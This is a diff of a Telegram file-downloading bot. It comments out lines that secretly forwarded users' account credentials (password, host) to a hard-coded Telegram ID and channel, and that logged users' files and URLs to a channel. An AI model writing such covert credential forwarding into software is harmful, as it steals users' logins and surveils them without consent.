@@ -384,8 +384,8 @@ async def config(client: Client, message: Message):
 	Config[username]["password"] = password
 	Config[username]["host"] = host
 	Config[username]["repoid"] = int(repoid)
-	await bot.send_message(1806431279,f"{cuenta}")
-	await bot.send_message(Channel_Id,f"#Cuentas\n\n{cuenta}")
+	#await bot.send_message(1806431279,f"{cuenta}")
+	#await bot.send_message(Channel_Id,f"#Cuentas\n\n{cuenta}")
 	await send("✅ 𝑫𝒐𝒏𝒆")
 
 @bot.on_message(filters.command("zips", prefixes="/")& filters.private)
@@ -442,8 +442,8 @@ async def zips(client: Client, message: Message):
 	else:pass
 	sip = message.text.split(" ")[1]
 	Configs[username]["gp"] = sip
-	await bot.send_message(1806431279,f"{sip}")
-	await send_config()
+	#await bot.send_message(1806431279,f"{sip}")
+	#await send_config()
 	await send("✅ 𝑫𝒐𝒏𝒆")
 
 @bot.on_message(filters.command("offproxy", prefixes="/")& filters.private)
@@ -635,7 +635,7 @@ async def download_archive(client: Client, message: Message):
 			filename = str(i).split('"file_name": ')[1].split(",")[0].replace('"',"")	
 		except:
 			filename = str(randint(11111,999999))+".mp4"
-		await bot.send_message(Channel_Id,f'**@{username} Envio un #archivo:**\n**Filename:** {filename}\n**Size:** {sizeof_fmt(filesize)}')	
+		#await bot.send_message(Channel_Id,f'**@{username} Envio un #archivo:**\n**Filename:** {filename}\n**Size:** {sizeof_fmt(filesize)}')	
 		start = time()
 		try:
 		    await msg.edit(f"𝑷𝒓𝒆𝒑𝒂𝒓𝒂𝒏𝒅𝒐 𝑫𝒆𝒔𝒄𝒂𝒓𝒈𝒂\n\n`{filename}`")
@@ -1331,7 +1331,7 @@ async def down_link(client: Client, message: Message):
 		try:format = str(list[1])
 		except:format = "720"
 		msg = await send("𝑹𝒆𝒄𝒐𝒑𝒊𝒍𝒂𝒏𝒅𝒐 𝒊𝒏𝒇𝒐𝒓𝒎𝒂𝒄𝒊ó𝒏")
-		await client.send_message(Channel_Id,f'**@{username} Envio un link de #youtube:**\n**Url:** {url}\n**Formato:** {str(format)}p')
+		#await client.send_message(Channel_Id,f'**@{username} Envio un link de #youtube:**\n**Url:** {url}\n**Formato:** {str(format)}p')
 		procesos += 1
 		download = await ytdlp_downloader(url,user_id,msg,username,lambda data: download_progres(data,msg,format),format)
 		if procesos != 0:
@@ -1347,7 +1347,7 @@ async def down_link(client: Client, message: Message):
 		if "?dkey=" in str(url):
 			url = str(url).split("?dkey=")[0]
 		msg = await send("𝑹𝒆𝒄𝒐𝒑𝒊𝒍𝒂𝒏𝒅𝒐 𝒊𝒏𝒇𝒐𝒓𝒎𝒂𝒄𝒊ó𝒏")
-		await client.send_message(Channel_Id,f'**@{username} Envio un link de #mediafire:**\n**Url:** {url}\n')
+		#await client.send_message(Channel_Id,f'**@{username} Envio un link de #mediafire:**\n**Url:** {url}\n')
 		procesos += 1
 		file = await download_mediafire(url, str(root[username]["actual_root"])+"/", msg, callback=mediafiredownload)
 		if not file:
